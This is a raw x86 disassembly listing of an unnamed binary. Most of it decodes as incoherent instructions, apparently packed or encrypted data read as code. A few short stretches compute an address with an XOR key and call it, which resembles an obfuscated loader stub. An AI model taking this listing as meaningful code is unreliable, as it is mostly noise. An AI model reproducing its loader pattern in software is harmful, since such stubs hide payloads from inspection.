  411319:	mov    WORD PTR [ebp+0x74],ds
  41131c:	jle    0x41132d
  41131e:	mov    bl,0x41
  411320:	xchg   edx,eax
  411321:	and    ebp,DWORD PTR [esi+0x18ea3ba2]
  411327:	ret    
  411328:	mov    edx,0x1b849953
  41132d:	add    DWORD PTR [ebp-0x1b],ebp
  411330:	cli    
  411331:	inc    esi
  411332:	add    al,0xca
  411334:	iret   
  411335:	dec    esp
  411336:	mov    DWORD PTR [ebp+0x40],edx
  411339:	push   es
  41133a:	ins    BYTE PTR es:[edi],dx
  41133b:	xchg   ebp,eax
  41133c:	adc    eax,0x7f212d1e
  411341:	out    dx,al
  411342:	call   0xe85ce9ad
  411347:	and    eax,0xfbd4af4
  41134c:	shl    BYTE PTR gs:[ebx+0x67],cl
  411350:	ss jl  0x411325
  411353:	xor    BYTE PTR [esi-0x3e259a62],al
  411359:	push   0x4d
  41135b:	xchg   esi,eax
  41135c:	pop    ss
  41135d:	sbb    bl,BYTE PTR [edx-0x2d954c4b]
  411363:	loop   0x4112f8
  411365:	in     al,0x8d
  411367:	cmp    ebx,0xffffffdb
  41136a:	jne    0x41135d
  41136c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41136d:	retf   
  41136e:	test   DWORD PTR ds:0x79e7789e,esi
  411374:	jbe    0x411399
  411376:	sub    edx,DWORD PTR [ecx]
  411378:	jmp    0xf7457c65
  41137d:	mov    al,ds:0xb8efe5f2
  411382:	or     eax,0x40a39535
  411387:	mov    ds:0x64761f5,eax
  41138c:	or     ebx,DWORD PTR [ebp+0x25fb9f06]
  411392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411393:	xchg   ebp,eax
  411394:	mov    bl,0xfb
  411396:	mov    WORD PTR [ecx],ds
  411398:	outs   dx,DWORD PTR ds:[esi]
  411399:	loop   0x411330
  41139b:	sub    eax,0x2fea9ebf
  4113a0:	pop    edx
  4113a1:	stc    
  4113a2:	xor    bl,dh
  4113a4:	rcl    cl,0xed
  4113a7:	ins    DWORD PTR es:[edi],dx
  4113a8:	jecxz  0x411412
  4113aa:	xor    al,0x75
  4113ac:	aam    0xd6
  4113ae:	test   DWORD PTR [ecx-0x2ab232e7],esp
  4113b4:	repz sbb eax,edi
  4113b7:	inc    esp
  4113b8:	adc    al,0xff
  4113ba:	test   BYTE PTR [edi+0x424b7261],dl
  4113c0:	xchg   esp,eax
  4113c1:	dec    esi
  4113c2:	jns    0x4113f9
  4113c4:	ins    BYTE PTR es:[edi],dx
  4113c5:	pop    ebx
  4113c6:	call   0xdc75:0xd0c84409
  4113cd:	nop
  4113ce:	lock sub al,0xae
  4113d1:	xchg   ecx,eax
  4113d2:	aaa    
  4113d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113d4:	sub    cl,dl
  4113d6:	imul   ecx,DWORD PTR [edx-0x1f],0xaf3cf225
  4113dd:	inc    ebp
  4113de:	adc    bh,dh
  4113e0:	dec    ecx
  4113e1:	test   al,0x13
  4113e3:	mov    eax,ds:0xa3d889d
  4113e8:	fisub  DWORD PTR [ecx+0x24e2baec]
  4113ee:	dec    edx
  4113ef:	adc    al,0x88
  4113f1:	mov    WORD PTR [edx-0x15],es
  4113f4:	dec    ebx
  4113f5:	addr16 jl 0x4113db
  4113f8:	scas   al,BYTE PTR es:[edi]
  4113f9:	outs   dx,DWORD PTR ds:[esi]
  4113fa:	pop    esi
  4113fb:	imul   esi,DWORD PTR [ebx+0x13c66136],0x4b
  411402:	aaa    
  411403:	push   0xffffffbb
  411405:	test   BYTE PTR [esi+0x1b],dl
  411408:	jbe    0x4113df
  41140a:	out    0x56,eax
  41140c:	pop    ebp
  41140d:	test   BYTE PTR [ecx],bh
  41140f:	in     al,0x37
  411411:	sub    cl,bl
  411413:	cmp    eax,0x3ee8c708
  411418:	or     DWORD PTR [edx-0x17],0x2ce44d4d
  41141f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411420:	cdq    
  411421:	jo     0x411432
  411423:	imul   edi,esi,0xffffffc1
  411426:	fistp  WORD PTR [esi+0x78]
  411429:	(bad)  
  41142a:	sub    al,ah
  41142c:	adc    DWORD PTR [ebp+0x7ebb50c1],ebp
  411432:	sbb    al,0xc3
  411434:	lods   al,BYTE PTR gs:[esi]
  411436:	cmp    BYTE PTR [edi],0xbb
  411439:	ja     0x4113d8
  41143b:	popf   
  41143c:	xchg   esi,eax
  41143d:	cdq    
  41143e:	jmp    0xec92d15d
  411443:	and    DWORD PTR [esi+edx*8-0x53],ebx
  411447:	enter  0x5178,0xb1
  41144b:	ja     0x411425
  41144d:	ins    BYTE PTR es:[edi],dx
  41144e:	fimul  DWORD PTR [ebx+0x48]
  411451:	(bad)  
  411452:	mov    esi,0xe1d4bc82
  411457:	add    bh,BYTE PTR [esi-0x61]
  41145a:	push   ecx
  41145b:	retf   
  41145c:	mov    fs,ebp
  41145e:	and    DWORD PTR [ebx],0x67
  411461:	fs cld 
  411463:	xchg   ebp,eax
  411464:	xor    al,0xca
  411466:	sbb    dl,0xc1
  411469:	push   eax
  41146a:	retf   0x2488
  41146d:	add    esi,esp
  41146f:	inc    edi
  411470:	out    0xdc,eax
  411472:	ror    BYTE PTR [esi+0x3d],cl
  411475:	jl     0x411442
  411477:	inc    ecx
  411478:	pusha  
  411479:	xchg   edi,eax
  41147a:	int    0xd0
  41147c:	sbb    eax,0x7216279a
  411481:	inc    esi
  411482:	inc    eax
  411483:	(bad)  
  411484:	adc    al,0x40
  411486:	shl    DWORD PTR [esi+0x7c],0x7b
  41148a:	pop    ebx
  41148b:	repnz push edx
  41148d:	inc    esp
  41148f:	and    al,0x35
  411491:	jno    0x411500
  411493:	scas   al,BYTE PTR es:[edi]
  411494:	xchg   ebp,eax
  411495:	retf   
  411496:	jnp    0x411434
  411498:	cmc    
  411499:	fist   DWORD PTR [ebx-0x37]
  41149c:	add    al,0x73
  41149e:	inc    esi
  41149f:	int    0xd9
  4114a1:	cmp    eax,0xd1dad832
  4114a6:	loopne 0x4114e8
  4114a8:	leave  
  4114a9:	std    
  4114aa:	aad    0x34
  4114ac:	xchg   edx,eax
  4114ad:	ret    0x5a0b
  4114b0:	mov    ah,0x8b
  4114b2:	test   eax,0x46f995ae
  4114b7:	inc    edi
  4114b8:	fcom   DWORD PTR [ebp+0x11]
  4114bb:	jne    0x41143e
  4114bd:	fdivr  QWORD PTR [ebx]
  4114bf:	xor    DWORD PTR [ebx-0x34],0x4e036354
  4114c6:	push   0x757bf44d
  4114cb:	pop    ds
  4114cc:	(bad)  
  4114ce:	lock mov esi,0xb1ccd87f
  4114d4:	ficomp DWORD PTR [ebx-0x10]
  4114d7:	xor    al,0xc0
  4114d9:	enter  0xd732,0x5a
  4114dd:	pop    esp
  4114de:	jl     0x41151b
  4114e0:	cmc    
  4114e1:	mov    dl,0x3f
  4114e3:	mov    ah,0x57
  4114e5:	pop    ebx
  4114e6:	(bad)  
  4114e7:	rcl    BYTE PTR [esi],1
  4114e9:	or     DWORD PTR [eax],esp
  4114eb:	push   ecx
  4114ec:	sbb    ecx,DWORD PTR [ecx-0x7fc3a04e]
  4114f2:	popa   
  4114f3:	out    dx,al
  4114f4:	jecxz  0x4114a5
  4114f6:	rcl    esp,1
  4114f8:	jo     0x4114d2
  4114fa:	xchg   esi,eax
  4114fb:	jle    0x4114be
  4114fd:	pop    ds
  4114fe:	stos   BYTE PTR es:[edi],al
  4114ff:	mov    bl,0x7f
  411501:	pop    esi
  411502:	and    al,0xee
  411504:	bound  ebx,QWORD PTR [edi+0x2e5f9ff7]
  41150a:	xchg   ebp,eax
  41150b:	retf   
  41150c:	add    bl,ah
  41150e:	mov    esi,?
  411510:	mov    esi,0xa538be85
  411515:	mov    dh,0x80
  411517:	push   ebp
  411518:	sti    
  411519:	sbb    DWORD PTR [ebp-0x2e63e5ff],0xffffffa3
  411520:	sub    BYTE PTR [edx+ebx*4+0x76],dh
  411524:	mov    ah,al
  411526:	ds das 
  411528:	cmp    eax,0xbb375811
  41152d:	xor    bh,BYTE PTR [esi+0x4746d5e7]
  411533:	push   0xffffffc8
  411535:	sub    eax,0xca8a4b82
  41153b:	dec    esi
  41153c:	cwde   
  41153d:	fst    DWORD PTR [edx]
  41153f:	xor    eax,0xf75e1fc2
  411544:	inc    eax
  411545:	daa    
  411546:	fstp   QWORD PTR [ebx+0x45]
  411549:	sar    BYTE PTR [edx-0x418704a0],1
  41154f:	(bad)  
  411550:	neg    eax
  411552:	mov    edi,0xb1a4a3cc
  411557:	mov    ds:0x2b67f024,al
  41155c:	les    ecx,FWORD PTR [edi-0x7e6196c4]
  411562:	pop    edi
  411563:	in     eax,0x92
  411565:	cmp    eax,0xeeb822f9
  41156a:	cmp    eax,0x9b2de8c1
  41156f:	adc    ebp,DWORD PTR [ecx+0x6f]
  411572:	jno    0x411577
  411574:	out    dx,al
  411575:	out    0x5a,eax
  411577:	lds    edx,FWORD PTR [edx]
  411579:	pop    ecx
  41157a:	loope  0x411512
  41157c:	add    al,0x32
  41157e:	or     al,ch
  411580:	lds    ebp,FWORD PTR [esi+0x33e08530]
  411586:	inc    eax
  411587:	push   edx
  411588:	cmp    al,0x1
  41158a:	inc    eax
  41158b:	lahf   
  41158c:	sub    esi,DWORD PTR [esi-0x12e2d3a9]
  411592:	push   esi
  411593:	std    
  411594:	fnstenv [eax+eiz*8-0x1a]
  411598:	aad    0x1c
  41159a:	dec    ebp
  41159b:	dec    edx
  41159c:	push   es
  41159d:	sub    ch,BYTE PTR ds:0x133b1dfd
  4115a3:	out    dx,al
  4115a4:	mov    dh,0x9d
  4115a6:	or     al,0x79
  4115a8:	fdivr  DWORD PTR ss:[esi+ebp*1+0x4c]
  4115ad:	or     BYTE PTR [eax+edx*1+0x7e],bh
  4115b1:	add    al,0xaf
  4115b3:	popf   
  4115b4:	test   al,0xed
  4115b6:	sbb    eax,0xd842abe8
  4115bb:	xchg   ebx,eax
  4115bc:	test   al,0xe4
  4115be:	add    al,0x24
  4115c0:	push   esi
  4115c1:	ds out dx,eax
  4115c3:	push   ss
  4115c4:	dec    esi
  4115c5:	and    eax,0xc74f918f
  4115ca:	in     al,dx
  4115cb:	adc    cl,BYTE PTR [edi-0x5e7e9c18]
  4115d1:	pop    ebx
  4115d2:	xchg   ecx,eax
  4115d3:	es call 0xa4454f5b
  4115d9:	jne    0x41155d
  4115db:	and    eax,0x6c601746
  4115e0:	and    BYTE PTR [ebx-0x3eccebab],cl
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	(bad)  
  41160d:	(bad)  
  41160e:	mov    bl,0x1a
  411610:	mov    bl,0xee
  411612:	inc    eax
  411613:	jo     0x411685
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x4115d9
  41161a:	add    DWORD PTR [ecx+0x30926881],edx
  411620:	retf   0xf58e
  411623:	mov    eax,0xfcbf5b66
  411628:	pop    es
  411629:	cld    
  41162a:	or     BYTE PTR [ebx+eax*8],ah
  41162d:	js     0x4115fb
  41162f:	mov    ds:0xda01401f,al
  411634:	jno    0x411624
  411636:	mov    edi,0x8c13c4ea
  41163b:	out    dx,al
  41163c:	push   edx
  41163d:	out    dx,eax
  41163e:	sub    dl,cl
  411640:	mov    eax,0x9ba4b64b
  411645:	push   ebx
  411646:	fmul   QWORD PTR [eax]
  411648:	inc    edi
  411649:	push   ss
  41164a:	(bad)  
  41164b:	sbb    DWORD PTR [eax+0x4b84542a],edx
  411651:	aam    0x36
  411653:	test   dh,0xde
  411656:	jbe    0x411658
  411658:	mov    DWORD PTR [ecx],esp
  41165a:	aad    0x50
  41165c:	jmp    0x45bbe1c9
  411661:	stos   DWORD PTR es:[edi],eax
  411662:	cdq    
  411663:	mov    bh,0x3c
  411665:	jne    0x41163f
  411667:	adc    cl,dh
  411669:	into   
  41166a:	aaa    
  41166b:	jae    0x41167a
  41166d:	dec    edx
  41166e:	dec    edi
  41166f:	push   ecx
  411670:	in     al,dx
  411671:	or     dh,BYTE PTR [ebx-0x1c]
  411674:	add    bh,BYTE PTR [edx+0x7d803bde]
  41167a:	mov    esi,0x29aa199f
  41167f:	ins    DWORD PTR es:[edi],dx
  411680:	pop    esi
  411681:	cmp    eax,0x2d234efd
  411686:	push   es
  411687:	clc    
  411688:	icebp  
  411689:	xor    DWORD PTR [ebp+0x6ce0989],ecx
  41168f:	adc    eax,0x7ff16a9b
  411694:	mov    ch,0x8b
  411696:	jle    0x41164c
  411698:	and    eax,0xabe653c7
  41169d:	inc    eax
  41169e:	xor    DWORD PTR [ebp-0x1c],edx
  4116a1:	sti    
  4116a2:	xor    BYTE PTR [ecx+ecx*4+0x6c],bl
  4116a6:	or     BYTE PTR [ebx],dh
  4116a8:	xor    DWORD PTR [ecx+0x23ca6aa1],esi
  4116ae:	push   ss
  4116af:	dec    eax
  4116b0:	mov    bl,0x80
  4116b2:	mov    ecx,0xa25a3616
  4116b7:	cmc    
  4116b8:	mov    esp,0x291ece5f
  4116bd:	push   ss
  4116be:	scas   al,BYTE PTR es:[edi]
  4116bf:	or     eax,0xe0b68378
  4116c4:	cld    
  4116c5:	out    dx,eax
  4116c6:	ror    BYTE PTR [ebx],cl
  4116c8:	(bad)  
  4116c9:	leave  
  4116ca:	inc    edx
  4116cb:	lahf   
  4116cc:	not    cl
  4116ce:	outs   dx,BYTE PTR ds:[esi]
  4116cf:	popa   
  4116d0:	mov    dl,0xec
  4116d2:	dec    ebx
  4116d3:	dec    esi
  4116d4:	jnp    0x41168d
  4116d6:	adc    eax,0xd63a9117
  4116db:	call   0xff1:0x72e0fce2
  4116e2:	repz mov al,ds:0x8ff603c
  4116e8:	jmp    0x4116c3
  4116ea:	unpckhps xmm0,XMMWORD PTR [ebx-0x6cffc30e]
  4116f1:	stos   WORD PTR es:[edi],ax
  4116f3:	inc    ebx
  4116f4:	cmp    al,0x38
  4116f6:	ror    DWORD PTR [edx+0x61b061da],0x14
  4116fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116fe:	mov    bl,0xf
  411700:	and    cl,BYTE PTR [eax+0x69]
  411703:	das    
  411704:	sub    BYTE PTR [ecx],dl
  411706:	and    eax,0xb5f7987
  41170b:	jns    0x4116e2
  41170d:	aas    
  41170e:	das    
  41170f:	icebp  
  411710:	inc    edx
  411711:	fwait
  411712:	mov    bl,0x91
  411714:	fdivr  DWORD PTR [ebp-0x27]
  411717:	mov    dl,0x76
  411719:	pop    esi
  41171a:	xchg   ecx,eax
  41171b:	mov    eax,ds:0x79e029f4
  411720:	sti    
  411721:	push   ds
  411722:	push   0x9fbf8559
  411727:	enter  0xebc5,0x5d
  41172b:	sub    bh,BYTE PTR [ebp+0x4a]
  41172e:	shr    bl,cl
  411730:	dec    ebx
  411731:	fmul   st,st(3)
  411733:	int3   
  411734:	jmp    0x411702
  411736:	imul   ebx,DWORD PTR [ebp-0x75cbff13],0xaa5b3aa2
  411740:	xchg   ebp,eax
  411741:	lds    esp,FWORD PTR [edx-0x3dfc4f82]
  411747:	mov    dh,0xdc
  411749:	stc    
  41174a:	xchg   ebx,eax
  41174b:	add    eax,0x164a0dc3
  411750:	mov    esi,0x9cb471f3
  411755:	aaa    
  411756:	jge    0x41177c
  411758:	sub    eax,0x35950515
  41175d:	mov    al,0xe3
  41175f:	popa   
  411760:	push   edi
  411761:	push   0xaadaacf
  411766:	xor    ebx,DWORD PTR [eax]
  411768:	or     ch,BYTE PTR [esi+0x6b5e1b72]
  41176e:	repz loope 0x4116f2
  411771:	cli    
  411772:	jle    0x411736
  411774:	fidivr DWORD PTR [ebp+0x53335e30]
  41177a:	mov    bl,BYTE PTR [ebp+0x10c2f62]
  411780:	repnz adc al,0x4
  411783:	jl     0x41176a
  411785:	inc    ebx
  411786:	retf   0x9fba
  411789:	inc    ecx
  41178a:	stc    
  41178b:	pop    edi
  41178c:	inc    edx
  41178d:	das    
  41178e:	xor    BYTE PTR [eax-0x1d3ddc6e],ah
  411794:	mov    ch,dl
  411796:	mov    ebx,0x49bb2aa0
  41179b:	sub    al,0x68
  41179d:	add    eax,0xdfdd33db
  4117a2:	jne    0x411790
  4117a4:	scas   al,BYTE PTR es:[edi]
  4117a5:	(bad)  [edx+eax*4+0x48]
  4117a9:	mov    esp,0xe2df0718
  4117ae:	or     esi,DWORD PTR [edi-0xe56ffee]
  4117b4:	in     al,dx
  4117b5:	test   BYTE PTR [edi-0x64],ah
  4117b8:	out    dx,eax
  4117b9:	int3   
  4117ba:	inc    ecx
  4117bb:	or     dl,ch
  4117bd:	or     BYTE PTR [esi-0x7d19de44],ah
  4117c3:	push   es
  4117c4:	out    0x77,al
  4117c6:	dec    ebx
  4117c7:	stos   BYTE PTR es:[edi],al
  4117c8:	push   0xffffffe1
  4117ca:	and    esi,ebp
  4117cc:	js     0x41177e
  4117ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117cf:	or     dh,BYTE PTR [ebp+0x2b]
  4117d2:	inc    ebx
  4117d3:	push   0x16683cf6
  4117d8:	fnsave [ebx+0x7ea53296]
  4117de:	adc    al,0x7f
  4117e0:	scas   eax,DWORD PTR es:[edi]
  4117e1:	mov    DWORD PTR [eax],edx
  4117e3:	cmp    al,0x81
  4117e5:	add    ebp,DWORD PTR [edi+0xd]
  4117e8:	cmp    BYTE PTR [esi],bh
  4117ea:	popf   
  4117eb:	out    0x6a,eax
  4117ed:	inc    edx
  4117ee:	and    eax,0x937ba4f
  4117f3:	loopne 0x411807
  4117f5:	es cmp eax,0xdd7a7f91
  4117fb:	mov    esp,edx
  4117fd:	repnz sar al,cl
  411800:	es cli 
  411802:	inc    edi
  411803:	retw   0x854
  411807:	or     esi,esp
  411809:	xchg   BYTE PTR [edx+0x2f550833],ch
  41180f:	mov    BYTE PTR [esi-0x56],cl
  411812:	std    
  411813:	popf   
  411814:	jl     0x41184c
  411816:	cmp    al,0x85
  411818:	xor    eax,0x79c8d987
  41181d:	and    BYTE PTR [edi],cl
  41181f:	dec    edx
  411820:	ficomp DWORD PTR [esi+0x64]
  411823:	cs ror eax,1
  411826:	inc    ecx
  411827:	shl    BYTE PTR [edx+esi*4-0x8],0xd6
  41182c:	pop    esp
  41182d:	sbb    DWORD PTR [edx+0x69214f2c],0x5e0de6f3
  411837:	dec    edx
  411838:	xor    BYTE PTR [ecx-0x1f62ea0e],dh
  41183e:	fst    QWORD PTR [ecx+0x31bcb91]
  411844:	pop    ecx
  411845:	out    dx,al
  411846:	in     eax,0x22
  411848:	test   DWORD PTR [edx-0x28b1397c],ebx
  41184e:	xor    DWORD PTR [edx+0x2f],edi
  411851:	jmp    0x23d9:0xdf8366be
  411858:	or     al,BYTE PTR [ecx]
  41185a:	inc    ecx
  41185b:	int    0x6f
  41185d:	rol    ebp,0x89
  411860:	dec    eax
  411861:	or     edi,0xece5d6c0
  411867:	xchg   edx,eax
  411868:	inc    esp
  411869:	push   ebp
  41186a:	repnz outs dx,DWORD PTR ds:[esi]
  41186c:	(bad)  
  41186d:	jmp    0x50f796a
  411872:	inc    edi
  411873:	jecxz  0x4118b8
  411875:	test   BYTE PTR [ecx+0x11bb895f],cl
  41187b:	mov    BYTE PTR [ebx+0x72ee0c2b],ch
  411881:	lods   eax,DWORD PTR ds:[esi]
  411882:	jne    0x411885
  411884:	rcl    BYTE PTR [ebx+ecx*8+0x5d11f144],1
  41188b:	inc    edi
  41188c:	aas    
  41188d:	mov    esi,0x63622021
  411892:	hlt    
  411893:	mov    ds:0xb6b32141,al
  411898:	mov    ecx,esi
  41189a:	mov    edi,0x60517441
  41189f:	lods   al,BYTE PTR ds:[esi]
  4118a0:	push   ss
  4118a1:	cmp    al,bh
  4118a3:	xor    eax,0x1a5939b8
  4118a8:	mov    BYTE PTR [edx-0x39],ah
  4118ab:	mov    ds:0x3e2ba1c4,al
  4118b0:	mov    BYTE PTR [ebx+0x4153dff4],dh
  4118b6:	inc    esp
  4118b7:	call   DWORD PTR [ebp+0x45996d3]
  4118bd:	push   ss
  4118be:	js     0x4118b1
  4118c0:	mov    dh,0x60
  4118c2:	mov    DWORD PTR [edx+0x57],ecx
  4118c5:	dec    edi
  4118c6:	shl    DWORD PTR [ebx],cl
  4118c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118c9:	or     DWORD PTR [edx+0x7bf7bda1],ebx
  4118cf:	jmp    0x88ef:0x7b913e7a
  4118d6:	ret    
  4118d7:	push   ss
  4118d8:	loope  0x41189e
  4118da:	mov    DWORD PTR [edi-0x6a],esp
  4118dd:	jmp    FWORD PTR [edi]
  4118df:	jno    0x41187e
  4118e1:	rcr    bh,0xfd
  4118e4:	xchg   esp,eax
  4118e5:	bound  edi,QWORD PTR [ebx]
  4118e7:	add    ch,ch
  4118e9:	mov    edx,0xa52363bc
  4118ee:	into   
  4118ef:	xchg   edx,eax
  4118f0:	bound  esp,QWORD PTR [ebx+0x6e]
  4118f3:	(bad)
  4118f6:	xor    BYTE PTR [ebx+0x27],0xdf
  4118fa:	mov    edx,0xd2fa729a
  4118ff:	mov    ebp,es
  411901:	adc    DWORD PTR [esi+0x4f524303],ebp
  411907:	out    dx,eax
  411908:	push   ecx
  411909:	xchg   esi,eax
  41190a:	cmp    DWORD PTR [eax+eax*2-0x51d032c3],ecx
  411911:	dec    edx
  411912:	jbe    0x411966
  411914:	ins    BYTE PTR es:[edi],dx
  411915:	lods   al,BYTE PTR ds:[esi]
  411916:	push   ecx
  411917:	jne    0x41189b
  411919:	mov    dh,0xd4
  41191b:	add    DWORD PTR [edi],ebp
  41191d:	lock pop ebp
  41191f:	fstp   QWORD PTR [ebx+0x55b3e9d6]
  411925:	(bad)  
  411926:	sub    eax,DWORD PTR [esi+0x74]
  411929:	push   ss
  41192a:	or     bl,cl
  41192c:	icebp  
  41192d:	addr16 mov al,ds:0xb389
  411931:	es jg  0x411943
  411934:	popf   
  411935:	push   esp
  411936:	idiv   ah
  411938:	jp     0x4118d7
  41193a:	mov    bl,bh
  41193c:	dec    eax
  41193d:	pop    ebp
  41193e:	fnstsw WORD PTR [esi-0x7f]
  411941:	adc    al,0xc0
  411943:	out    dx,eax
  411944:	jne    0x41191a
  411946:	js     0x411907
  411948:	ss or  al,0xc2
  41194b:	add    esp,eax
  41194d:	inc    eax
  41194e:	pop    ebx
  41194f:	call   DWORD PTR [ebx-0x6f991b58]
  411955:	pop    edi
  411956:	ja     0x411950
  411958:	mov    al,0x54
  41195a:	dec    edx
  41195b:	and    al,0x98
  41195d:	int3   
  41195e:	jecxz  0x4119ae
  411960:	arpl   WORD PTR [ebx],dx
  411962:	and    al,BYTE PTR [eax+esi*4]
  411965:	add    DWORD PTR [edx-0x6cbef66c],ebp
  41196b:	or     BYTE PTR [ebx],bh
  41196d:	push   0xe284dff2
  411972:	retf   0x13c0
  411975:	push   0xffffff82
  411977:	test   BYTE PTR [ebx-0x1d],0x25
  41197b:	into   
  41197c:	cs xor edx,0xc6edeb6c
  411983:	mov    BYTE PTR [esi+ebx*8-0x70187f94],dh
  41198a:	dec    ecx
  41198b:	test   dl,bl
  41198d:	mov    ebx,0x2fff9d5e
  411992:	clc    
  411993:	jle    0x41198b
  411995:	jb     0x41196d
  411997:	sub    cl,BYTE PTR [eax]
  411999:	stos   BYTE PTR es:[edi],al
  41199a:	in     al,0x1a
  41199c:	or     al,0xed
  41199e:	es mov dl,0x39
  4119a1:	(bad)  
  4119a3:	push   eax
  4119a4:	popa   
  4119a5:	test   al,0xd0
  4119a7:	add    eax,0x210c1cf5
  4119ac:	dec    ebp
  4119ad:	sub    al,BYTE PTR [ecx+0x3b277689]
  4119b3:	xchg   DWORD PTR [ebx+0x28d31a97],esp
  4119b9:	sti    
  4119ba:	in     eax,0xd8
  4119bc:	sar    BYTE PTR [edi-0xfbd87cb],0xfe
  4119c3:	lock pop ecx
  4119c5:	scas   al,BYTE PTR es:[edi]
  4119c6:	not    BYTE PTR [ecx+0x4]
  4119c9:	sub    al,0x5d
  4119cb:	dec    esi
  4119cc:	lahf   
  4119cd:	cs (bad) 
  4119cf:	mov    al,ds:0xcc8edb9f
  4119d4:	xchg   ecx,eax
  4119d5:	add    DWORD PTR [esi-0x426fb442],0x58d1a572
  4119df:	pop    ecx
  4119e0:	xchg   esp,eax
  4119e1:	inc    ecx
  4119e2:	retf   0xd2e4
  4119e5:	sub    esp,DWORD PTR [ecx+edi*2]
  4119e8:	cli    
  4119e9:	dec    edx
  4119ea:	sub    al,0xa6
  4119ec:	imul   esp,DWORD PTR [ebp-0x7af02e0e],0xffffffc6
  4119f3:	out    dx,eax
  4119f4:	(bad)  
  4119f5:	dec    DWORD PTR [ebx+0x5e9de]
  4119fb:	add    BYTE PTR [eax],al
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0xdf812e7d
  411a40:	xchg   ecx,eax
  411a41:	(bad)  
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x411a9d
  411a4a:	adc    esi,DWORD PTR [eax]
  411a4c:	rcl    edx,cl
  411a4e:	nop
  411a4f:	pop    ebx
  411a50:	test   DWORD PTR [edx-0x594c1d66],edx
  411a56:	mov    edx,DWORD PTR [ebp-0x29]
  411a59:	or     bh,BYTE PTR [edi-0x7a]
  411a5c:	and    DWORD PTR [edi],ecx
  411a5e:	add    DWORD PTR [eax],edx
  411a60:	xor    al,0x2a
  411a62:	mov    ebp,0x61fbc6bb
  411a67:	fsub   DWORD PTR [ebp-0x2a]
  411a6a:	loop   0x411a5b
  411a6c:	addr16 cld 
  411a6e:	mov    edx,0x4c263a2
  411a73:	dec    eax
  411a74:	out    0xe6,eax
  411a76:	xor    al,0xe6
  411a78:	retf   0xfa06
  411a7b:	(bad)  
  411a7c:	mov    edx,DWORD PTR [ebp+0x5d5009c4]
  411a82:	jle    0x411a78
  411a84:	xor    ah,BYTE PTR [edi+0x59]
  411a87:	xor    esi,ebp
  411a89:	nop
  411a8a:	sub    eax,0xb238affb
  411a8f:	xchg   edi,eax
  411a90:	inc    edi
  411a91:	jp     0x411a3c
  411a93:	scas   al,BYTE PTR es:[edi]
  411a94:	jne    0x411af5
  411a96:	mov    edx,0x165cf971
  411a9b:	pop    edi
  411a9c:	mov    cl,0xd
  411a9e:	nop
  411a9f:	ja     0x411b18
  411aa1:	pop    DWORD PTR [ebx]
  411aa3:	and    esi,eax
  411aa5:	in     eax,0x3c
  411aa7:	mov    ds:0x3415179b,eax
  411aac:	inc    ebp
  411aad:	or     DWORD PTR [edi+ebx*1+0xb7daa1f],eax
  411ab4:	rcl    BYTE PTR [edi],cl
  411ab6:	shl    BYTE PTR [ebx+0x2d342032],0x68
  411abd:	neg    DWORD PTR [ebp+0x674f0b08]
  411ac3:	xor    ebx,DWORD PTR [eax]
  411ac5:	icebp  
  411ac6:	cwde   
  411ac7:	dec    DWORD PTR [eax+0x71480dd3]
  411acd:	call   0x1100:0x4ae3a7dc
  411ad4:	and    DWORD PTR [edx+0xb],ebp
  411ad7:	fdivr  DWORD PTR [eax+0x29]
  411ada:	cmp    al,0x18
  411adc:	shr    DWORD PTR [ebp+0x8],0xe7
  411ae0:	sub    edi,ecx
  411ae2:	test   al,0xb7
  411ae4:	pop    es
  411ae5:	sar    DWORD PTR [ebx-0x6e],1
  411ae8:	iret   
  411ae9:	sbb    eax,0xb3ad81d3
  411aee:	and    ah,ch
  411af0:	in     al,0x8c
  411af2:	inc    edi
  411af3:	dec    ecx
  411af4:	dec    edx
  411af5:	and    bl,al
  411af7:	pop    edx
  411af8:	jb     0x411b76
  411afa:	sub    al,0xcd
  411afc:	pop    ds
  411afd:	test   al,ch
  411aff:	test   ah,0x6a
  411b02:	inc    ecx
  411b03:	sbb    esi,DWORD PTR [edx]
  411b05:	mov    ds:0xd5f5c71d,al
  411b0a:	jae    0x411b49
  411b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b0d:	aas    
  411b0e:	bnd ja 0x411abe
  411b11:	fidiv  WORD PTR [ebx]
  411b13:	das    
  411b14:	xor    DWORD PTR [ebx-0x5b7d8488],ebx
  411b1a:	call   0x755a:0x7cc49d36
  411b21:	push   esi
  411b22:	sub    BYTE PTR [ecx],dl
  411b24:	paddb  mm4,QWORD PTR [edi-0x38c1e2dc]
  411b2b:	fistp  QWORD PTR [esi-0x211a7069]
  411b31:	jg     0x411b0c
  411b33:	mov    bh,0xf9
  411b35:	sub    ebx,eax
  411b37:	aaa    
